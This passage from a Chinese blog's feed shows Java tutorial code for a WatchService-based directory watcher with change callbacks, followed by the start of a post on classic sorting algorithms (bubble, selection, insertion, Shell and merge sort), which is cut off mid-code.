dir</span></div><div class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(Path dir)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        WatchKey key = dir.register(watcher, StandardWatchEventKinds.ENTRY_CREATE, StandardWatchEventKinds.ENTRY_DELETE, StandardWatchEventKinds.ENTRY_MODIFY);</div><div class="line">        keys.put(key, dir);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 观察指定的目录，并且包括子目录</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">registerAll</span><span class="params">(<span class="keyword">final</span> Path start)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">        Files.walkFileTree(start, <span class="keyword">new</span> SimpleFileVisitor&lt;Path&gt;() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">preVisitDirectory</span><span class="params">(Path dir, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">                register(dir);</div><div class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 发生文件变化的回调函数</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">processEvents</span><span class="params">(FileActionCallback callback)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (;;) &#123;</div><div class="line">            WatchKey key;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                key = watcher.take();</div><div class="line">            &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</div><div class="line">                <span class="keyword">return</span>;</div><div class="line">            &#125;</div><div class="line">            Path dir = keys.get(key);</div><div class="line">            <span class="keyword">if</span> (dir == <span class="keyword">null</span>) &#123;</div><div class="line">                System.err.println(<span class="string">"操作未识别"</span>);</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line"> </div><div class="line">            <span class="keyword">for</span> (WatchEvent&lt;?&gt; event : key.pollEvents()) &#123;</div><div class="line">                Kind kind = event.kind();</div><div class="line"> </div><div class="line">                <span class="comment">// 事件可能丢失或遗弃</span></div><div class="line">                <span class="keyword">if</span> (kind == StandardWatchEventKinds.OVERFLOW) &#123;</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line"> </div><div class="line">                <span class="comment">// 目录内的变化可能是文件或者目录</span></div><div class="line">                WatchEvent&lt;Path&gt; ev = cast(event);</div><div class="line">                Path name = ev.context();</div><div class="line">                Path child = dir.resolve(name);</div><div class="line">                File file = child.toFile();</div><div class="line">                <span class="keyword">if</span> (kind.name().equals(FileAction.DELETE.getValue())) &#123;</div><div class="line">                    callback.delete(file);</div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (kind.name().equals(FileAction.CREATE.getValue())) &#123;</div><div class="line">                    callback.create(file);</div><div class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (kind.name().equals(FileAction.MODIFY.getValue())) &#123;</div><div class="line">                    callback.modify(file);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                &#125;</div><div class="line"> </div><div class="line">                <span class="comment">// if directory is created, and watching recursively, then</span></div><div class="line">                <span class="comment">// register it and its sub-directories</span></div><div class="line">                <span class="keyword">if</span> (subDir &amp;&amp; (kind == StandardWatchEventKinds.ENTRY_CREATE)) &#123;</div><div class="line">                    <span class="keyword">try</span> &#123;</div><div class="line">                        <span class="keyword">if</span> (Files.isDirectory(child, NOFOLLOW_LINKS)) &#123;</div><div class="line">                            registerAll(child);</div><div class="line">                        &#125;</div><div class="line">                    &#125; <span class="keyword">catch</span> (IOException x) &#123;</div><div class="line">                        <span class="comment">// ignore to keep sample readbale</span></div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"> </div><div class="line">            <span class="keyword">boolean</span> valid = key.reset();</div><div class="line">            <span class="keyword">if</span> (!valid) &#123;</div><div class="line">                <span class="comment">// 移除不可访问的目录</span></div><div class="line">                <span class="comment">// 因为有可能目录被移除，就会无法访问</span></div><div class="line">                keys.remove(key);</div><div class="line">                <span class="comment">// 如果待监控的目录都不存在了，就中断执行</span></div><div class="line">                <span class="keyword">if</span> (keys.isEmpty()) &#123;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="文件变更行为枚举"><a href="#文件变更行为枚举" class="headerlink" title="文件变更行为枚举"></a>文件变更行为枚举</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> org.xdemo.superutil.j2se.filewatch;</div><div class="line"> </div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 文件变动行为枚举</span></div><div class="line"><span class="comment"> * <span class="doctag">@author</span> Goofy &lt;a href="http://www.xdemo.org/"&gt;http://www.xdemo.org/&lt;/a&gt;</span></div><div class="line"><span class="comment"> * <span class="doctag">@Date</span> 2015年7月3日 上午10:40:04</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">enum</span> FileAction &#123;</div><div class="line">    DELETE(<span class="string">"ENTRY_DELETE"</span>), CREATE(<span class="string">"ENTRY_CREATE"</span>), MODIFY(<span class="string">"ENTRY_MODIFY"</span>);</div><div class="line">    <span class="keyword">private</span> String value;</div><div class="line"> </div><div class="line">    FileAction(String value) &#123;</div><div class="line">        <span class="keyword">this</span>.value = value;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> value;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="文件变动回调方法"><a href="#文件变动回调方法" class="headerlink" title="文件变动回调方法"></a>文件变动回调方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"> </div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"> </div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 文件操作的回调方法</span></div><div class="line"><span class="comment"> * <span class="doctag">@author</span> Goofy &lt;a href="http://www.xdemo.org/"&gt;http://www.xdemo.org/&lt;/a&gt;</span></div><div class="line"><span class="comment"> * <span class="doctag">@Date</span> 2015年7月6日 上午11:11:34</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileActionCallback</span> </span>&#123;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">    &#125;;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">modify</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">    &#125;;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">    &#125;;</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> org.xdemo.superutil.j2se.filewatch;</div><div class="line"> </div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"> </div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * </span></div><div class="line"><span class="comment"> * <span class="doctag">@author</span> Goofy</span></div><div class="line"><span class="comment"> * <span class="doctag">@Date</span> 2015年7月6日 上午11:22:32</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Usage</span> </span>&#123;</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        <span class="keyword">final</span> File file = <span class="keyword">new</span> File(<span class="string">"D:\\upload"</span>);</div><div class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</div><div class="line">                <span class="keyword">try</span> &#123;</div><div class="line">                    <span class="keyword">new</span> WatchDir(file, <span class="keyword">true</span>, <span class="keyword">new</span> FileActionCallback() &#123;</div><div class="line">                        <span class="meta">@Override</span></div><div class="line">                        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">create</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">                            System.out.println(<span class="string">"文件已创建\t"</span> + file.getAbsolutePath());</div><div class="line">                        &#125;</div><div class="line"> </div><div class="line">                        <span class="meta">@Override</span></div><div class="line">                        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">                            System.out.println(<span class="string">"文件已删除\t"</span> + file.getAbsolutePath());</div><div class="line">                        &#125;</div><div class="line"> </div><div class="line">                        <span class="meta">@Override</span></div><div class="line">                        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">modify</span><span class="params">(File file)</span> </span>&#123;</div><div class="line">                            System.out.println(<span class="string">"文件已修改\t"</span> + file.getAbsolutePath());</div><div class="line">                        &#125;</div><div class="line">                    &#125;);</div><div class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;).start();</div><div class="line"> </div><div class="line">        System.out.println(<span class="string">"正在监视文件夹:"</span> + file.getAbsolutePath() + <span class="string">"的变化"</span>);</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>修改文件名称会产生多个事件<br>待修改文件–&gt;删除该文件-&gt;创建该文件-&gt;修改该文件<br>对于子文件夹的内容变动，也会引起该子文件夹的修改事件</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;很多时候我们需要对文件夹或者文件进行监控，已观察其是否被删除、创建或者修改，然后根据文件的行为进行相应的后续处理，以往的话多数是通过轮询去观察文件夹或者文件的变动，这样肯定会经过磁盘的I/O的操作，大大的降低了效率，而且不能及时的响应，如果要提升响应速度必定会增加磁盘的占用
      
    
    </summary>
    
      <category term="后端" scheme="http://yoursite.com/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java常见的排序算法</title>
    <link href="http://yoursite.com/2017/05/04/Java%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>http://yoursite.com/2017/05/04/Java常见的排序算法/</id>
    <published>2017-05-04T06:38:29.000Z</published>
    <updated>2018-01-16T17:04:31.711Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>排序就是将一组对象按照某种逻辑顺序重新排列的过程。比如信用卡账单中的交易是按照日期排序的——这种排序很可能使用了某种排序算法。在计算时代早期，大家普遍认为30%的计算周期都用在了排序上，今天这个比例可能降低了，大概是因为现在的排序算法更加高效。现在这个时代数据可以说是无处不在，而整理数据的第一步往往就是进行排序。所有的计算机系统都实现了各种排序算法以供系统和用户使用。<br>　　即使你只是使用标准库中的排序函数，学习排序算法仍然有很大的实际意义：</p><ul><li>排序算法往往是我们解决其他问题的第一步</li><li>排序算法有助于我们理解其他算法</li><li>算法在公司面试中占有很大比例，排序算法作为其中的重要组成部分，我们理所当然要学好了。<br>　　另外，更重的是下面介绍的这些算法都很经典，优雅而且高效，学习其中的精髓对自己提高自己的编程能力也有很大的帮助。<br>　　排序在商业数据处理和现代科学计算中有很重要的地位，它能够应用于事务处理,组合优化，天体物理学，分子动力学，语言学，基因组学，天气预报和很多其他领域。下面会介绍的一种排序算法（快速排序）甚至被誉为20世纪科学和工程领域的十大算法之一。后面我们会依次学习几种经典的排序算法，并高效地实现“优先队列”这种基础数据类型。我们将讨论比较排序算法的理论基础并中借若干排序算法和优先队列的应用。</li></ul><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>1.原理：比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。针对所有的元素重复以上的步骤，除了最后一个。持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。<br>代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] numbers)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> size = numbers.length;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size - <span class="number">1</span>; i++) &#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; size - <span class="number">1</span> - i; j++) &#123;</div><div class="line">             <span class="comment">// 交换两数位置</span></div><div class="line">            <span class="keyword">if</span> (numbers[j] &gt; numbers[j + <span class="number">1</span>])</div><div class="line">            &#123;</div><div class="line">                temp = numbers[j];</div><div class="line">                numbers[j] = numbers[j + <span class="number">1</span>];</div><div class="line">                numbers[j + <span class="number">1</span>] = temp;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>介绍：选择排序市一中很容易理解和实现的简单排序算法。学习它之前首先要知道它的两个很鲜明的特点。</p><ul><li>运行时间和输入无关。为了找出最小的元素而扫描一遍数组并不能为下一遍扫描提供任何实质性帮助的信息。因此使用这种排序的我们会惊讶的发现，一个已经有序的数组或者数组内元素全部相等的数组和一个元素随机排列的数组所用的排序时间竟然一样长！而其他算法会更善于利用输入的初始状态，选择排序则不然。</li><li>数据移动是最少的选择排序的交换次数和数组大小关系是线性关系。看下面的原理时可以很容易明白这一点。</li></ul><p>原理：在要排序的一组数中，选出最小的一个数与第一个位置的数交换；然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。类似下图：</p><p><img src="https://user-gold-cdn.xitu.io/2017/11/3/1b36a751c668b6c0fbb99fab8ad88a8f" alt="描述"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>[] numbers)</span> </span>&#123;</div><div class="line">    <span class="comment">// 数组长度</span></div><div class="line">    <span class="keyword">int</span> size = numbers.length; </div><div class="line">    <span class="comment">// 中间变量</span></div><div class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>; </div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</div><div class="line">        <span class="comment">// 待确定的位置</span></div><div class="line">        <span class="keyword">int</span> k = i; </div><div class="line">        <span class="comment">// 选择出应该在第i个位置的数</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = size - <span class="number">1</span>; j &gt; i; j--) &#123;</div><div class="line">            <span class="keyword">if</span> (numbers[j] &lt; numbers[k]) &#123;</div><div class="line">                k = j;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="comment">// 交换两个数</span></div><div class="line">        temp = numbers[i];</div><div class="line">        numbers[i] = numbers[k];</div><div class="line">        numbers[k] = temp;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>介绍：通常人们整理桥牌的方法是一张一张的来，将每一张牌插入到其他已经有序牌中的适当位置。在计算机的实现中，为了给要插入的元素腾出空间，我们需要将其余所有元素在插入之前都向右移动以为。这种算法就叫插入排序。<br>　**　与选择排序一样，当前索引左边的所有元素都是有序的，但他们的最终位置还不确定为了给更小的元素腾出空间，他们可能会被移动。但是当索引到达数组的右端时，数组排序就完成了。<br>　　和选择排序不同的是，插入排序所需的时间取决于输入中元素的初始顺序。也就是说对一个接近有序或有序的数组进行排序会比随机顺序或是逆序的数组进行排序要快的多。<br>原理：每步将一个待排序的记录，按其顺序码大小插入到前面已经排序的字序列的合适位置（从后向前找到合适位置后），直到全部插入排序完为止。类似下图： </p><p><img src="https://user-gold-cdn.xitu.io/2017/11/3/e17136c994fbefa7e482a879bc4727bd" alt="描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * 插入排序</span></div><div class="line"><span class="comment"> * </span></div><div class="line"><span class="comment"> * 从第一个元素开始，该元素可以认为已经被排序 取出下一个元素，在已经排序的元素序列中从后向前扫描</span></div><div class="line"><span class="comment"> * 如果该元素（已排序）大于新元素，将该元素移到下一位置 重复步骤3，直到找到已排序的元素小于或者等于新元素的位置 将新元素插入到该位置中 重复步骤2</span></div><div class="line"><span class="comment"> * </span></div><div class="line"><span class="comment"> * <span class="doctag">@param</span> numbers</span></div><div class="line"><span class="comment"> *            待排序数组</span></div><div class="line"><span class="comment"> */</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] numbers)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> size = numbers.length;</div><div class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</div><div class="line">        temp = numbers[i];</div><div class="line">        <span class="comment">// 假如temp比前面的值小，则将前面的值后移</span></div><div class="line">        <span class="keyword">for</span> (j = i; j &gt; <span class="number">0</span> &amp;&amp; temp &lt; numbers[j - <span class="number">1</span>]; j--) &#123;</div><div class="line">            numbers[j] = numbers[j - <span class="number">1</span>];</div><div class="line">        &#125;</div><div class="line">        numbers[j] = temp;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p>介绍:这个排序咋一看名字感觉很高大上，这是以D.L.shell名字命名的排序算法。为了展示初级排序算法性质的价值，我们来看一下基于插入排序的快速的排序算法——希尔排序。对于大规模乱序的数组插入排序很慢，因为它只会交换相邻的元素，因此元素只能一点一点地从数组的一端移动到另一端。如果最小的元素刚好在数组的尽头的话，那么要将它移动到正确的位置要N-1次移动。希尔排序为了加快速度简单地改进了插入排序，交换不相邻的元素以对数组的局部进行排序，并最终用插入排序将局部有序的数组排序。</p><p>原理：先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">    * 希尔排序的原理:根据需求，如果你想要结果从大到小排列，它会首先将数组进行分组，然后将较大值移到前面，较小值</span></div><div class="line"><span class="comment">    * 移到后面，最后将整个数组进行插入排序，这样比起一开始就用插入排序减少了数据交换和移动的次数，可以说希尔排序是加强 版的插入排序 拿数组5, 2,</span></div><div class="line"><span class="comment">    * 8, 9, 1, 3，4来说，数组长度为7，当increment为3时，数组分为两个序列</span></div><div class="line"><span class="comment">    * 5，2，8和9，1，3，4，第一次排序，9和5比较，1和2比较，3和8比较，4和比其下标值小increment的数组值相比较</span></div><div class="line"><span class="comment">    * 此例子是按照从大到小排列，所以大的会排在前面，第一次排序后数组为9, 2, 8, 5, 1, 3，4</span></div><div class="line"><span class="comment">    * 第一次后increment的值变为3/2=1,此时对数组进行插入排序， 实现数组从大到小排</span></div><div class="line"><span class="comment">    */</span></div><div class="line"></div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shellSort</span><span class="params">(<span class="keyword">int</span>[] data)</span> </span>&#123;</div><div class="line">       <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">       <span class="keyword">int</span> temp = <span class="number">0</span>;</div><div class="line">       <span class="comment">// 每次将步长缩短为原来的一半</span></div><div class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> increment = data.length / <span class="number">2</span>; increment &gt; <span class="number">0</span>; increment /= <span class="number">2</span>) &#123;</div><div class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = increment; i &lt; data.length; i++) &#123;</div><div class="line">               temp = data[i];</div><div class="line">               <span class="keyword">for</span> (j = i; j &gt;= increment; j -= increment) &#123;</div><div class="line">                  <span class="comment">// 如想从小到大排只需修改这里</span></div><div class="line">                   <span class="keyword">if</span> (temp &gt; data[j - increment])</div><div class="line">                   &#123;</div><div class="line">                       data[j] = data[j - increment];</div><div class="line">                   &#125; <span class="keyword">else</span> &#123;</div><div class="line">                       <span class="keyword">break</span>;</div><div class="line">                   &#125;</div><div class="line"></div><div class="line">               &#125;</div><div class="line">               data[j] = temp;</div><div class="line">           &#125;</div><div class="line"></div><div class="line">       &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>介绍：归并即将两个有序的数组归并并成一个更大的有序数组。人们很快根据这个思路发明了一种简单的递归排序算法：归并排序。要将一个数组排序，可以先（递归地）将它分成两半分别排序，然后将结果归并起来。归并排序最吸引人的性质是它能保证任意长度为N的数组排序所需时间和NlogN成正比；它的主要缺点也显而易见就是它所需的额外空间和N成正比。简单的归并排序如下图：<br><img src="https://user-gold-cdn.xitu.io/2017/11/3/02047bb24ff43e5a7bc172793929a694" alt="描述"></p><p>原理：归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。合并方法：<br>设r[i…n]由两个有序子表r[i…m]和r[m+1…n]组成，两个子表长度分别为n-i +1、n-m。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1、j=m+1；k=i；i=i; //置两个子表的起始下标及辅助数组的起始下标</div><div class="line">2、若i&gt;m 或j&gt;n，转⑷ //其中一个子表已合并完，比较选取结束</div><div class="line">3、//选取r[i]和r[j]较小的存入辅助数组rf</div><div class="line">        如果r[i]&lt;r[j]，rf[k]=r[i]； i++； k++； 转⑵</div><div class="line">        否则，rf[k]=r[j]； j++； k++； 转⑵</div><div class="line">4、//将尚未处理完的子表中元素存入rf</div><div class="line">        如果i&lt;=m，将r[i…m]存入rf[k…n] //前一子表非空</div><div class="line">        如果j&lt;=n ,  将r[j…n] 存入rf[k…n] //后一子表非空</div><div class="line">5、合并结束。</div></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">     * 归并排序 简介:将两个（或两个以上）有序表合并成一个新的有序表</span></div><div class="line"><span class="comment">     * 即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列 时间复杂度为O(nlogn) 稳定排序方式</span></div><div class="line"><span class="comment">     * </span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> nums</span></div><div class="line"><span class="comment">     *            待排序数组</span></div><div class="line"><span class="comment">     * <span class="doctag">@return</span> 输出有序数组</span></div><div class="line"><span class="comment">     */</span></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] mergeSort(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> low, <span class="keyword">int</span> high) &#123;</div><div class="line">        <span class="keyword">int</span> mid = (low + high) / <span 